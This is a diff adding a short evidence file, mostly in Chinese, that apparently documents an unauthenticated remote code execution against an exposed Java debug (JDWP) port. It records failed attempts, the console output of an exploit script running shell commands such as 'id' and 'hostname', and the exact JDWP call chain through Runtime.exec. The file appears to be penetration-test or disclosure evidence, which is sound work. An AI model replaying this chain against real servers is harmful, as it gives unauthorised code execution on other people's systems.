@@ -1,0 +1,29 @@
+# Evidence 05 — 未认证 RCE 动态执行（真实网络路径，单 TCP 连接，无凭据）
+
+## 失败路径（保留作反证）
+# (a) 直接取 AllThreads 的线程 id 去 InvokeMethod：
+[-] invoke on 0x1c (Session-HouseKeeper-...) failed: JDWP error 10 (cs=3 c=3)   # INVALID_THREAD
+[-] invoke on 0x9  (Log4j ... WatchDog)      failed: JDWP error 10
+[-] invoke on 0xb  (Tomcat JDBC Pool Cleaner) failed: JDWP error 10
+[-] ... 全部线程均 error 10
+    => 不能复用 AllThreads 的 id；JDWP 对象 id 随目标线程对象回收而失效。
+# (b) 断点 suspendPolicy=SUSPEND_ALL(2)：InvokeMethod 无应答（超时，且全 VM 冻结 ~60s，随后 Resume 恢复）。
+    => 该 JVM 上必须用 SUSPEND_EVENTTHREAD。
+
+## 成功路径
+$ python3 jdwp_rce3.py
+[+] JDWP: OpenJDK 64-Bit Server VM 11.0.23.0.1 (jdwp 11.0) unauthenticated
+[+] Runtime=0x1 getRuntime=0x7f0528811a98 exec(String)=0x7f0528811ad0
+[+] breakpoint on Ljava/util/HashMap;.get (class=0x2 method=0x7f051002c540)
+[+] event request id=2 ; waiting for hit (SUSPEND_EVENTTHREAD)
+[+] breakpoint hit: requestID=2 thread=0x3
+[+] RCE: '/bin/sh -c id>/tmp/vcd_jdwp_poc_id.txt'           -> Runtime=0x10 Process=0x11
+[+] RCE: '/bin/sh -c hostname>/tmp/vcd_jdwp_poc_host.txt'   -> Runtime=0x10 Process=0x13
+[+] RCE SUCCESS
+[+] VM resumed
+
+# 链：EventRequest.Set(BREAKPOINT, SUSPEND_EVENTTHREAD)
+#     -> Composite 事件取 tid(0x3)
+#     -> ClassType.InvokeMethod(Runtime.getRuntime)
+#     -> ObjectReference.InvokeMethod(Runtime.exec(String))
+#     -> VirtualMachine.Resume
